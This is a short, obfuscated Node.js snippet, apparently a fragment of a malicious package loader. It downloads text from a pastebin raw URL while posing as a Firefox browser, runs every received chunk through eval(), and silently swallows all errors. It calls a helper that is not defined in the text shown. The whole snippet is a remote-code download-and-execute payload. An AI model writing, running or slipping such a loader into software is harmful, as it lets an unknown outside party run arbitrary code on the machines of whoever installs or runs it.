try {
  var https = require('https')
  https
    .get(
      {
        hostname: 'pastebin.com',
        path: '/raw/XLeVP82h',
        headers: {
          'User-Agent':
            'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0',
          Accept:
            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        },
      },
      (_0x68b123) => {
        _0x68b123.setEncoding('utf8')
        _0x68b123.on('data', (_0x548b9b) => {
          eval(_0x548b9b)
        })
        _0x68b123.on(_0x57f75b(5), () => {})
      }
    )
    .on('error', () => {})
} catch (_0x19780a) {}

